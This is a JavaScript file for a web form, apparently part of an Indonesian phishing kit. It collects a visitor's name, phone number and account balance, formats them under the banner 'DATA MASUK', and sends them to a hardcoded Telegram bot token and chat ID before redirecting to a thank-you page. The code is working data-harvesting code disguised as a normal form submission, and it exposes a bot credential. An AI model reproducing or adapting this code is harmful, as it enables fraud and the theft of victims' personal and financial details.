import { API_URL } from './global.js';

$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Bagas");
	$("#balance").val("20000000");
	$("#phone").val("81123456789");*/
	/* */
	$("#balance").on('input', function() {
		let value = $("#balance").val().trim().replace(/[^0-9]/g, '');
        $("#balance").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

function next() {
	var name = $("#name").val().trim();
	var balance = $("#balance").val().trim();
	var phone = $("#phone").val().trim();
	if (name=="" || balance=="" || phone=="") {
		alert('Mohon lengkapi data!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var message = "⚔⚔⚔ DATA MASUK ⚔⚔⚔\n";
	message += ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\nRp'+balance+'\n\n');
	message += "⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜⚜";
	
	fetch(`https://api.telegram.org/bot8028906751:AAF_j-7Z2gtcsf3YFKqAga2C25phsQqYTiQ/sendMessage?parse_mode=html`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: "7258041908",
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        $("#loader").css('display', 'none');
		window.location.href = "thank.html";
      })
      .catch((error) => {
        alert('Failed to send message.');
      });
}

module.next = next;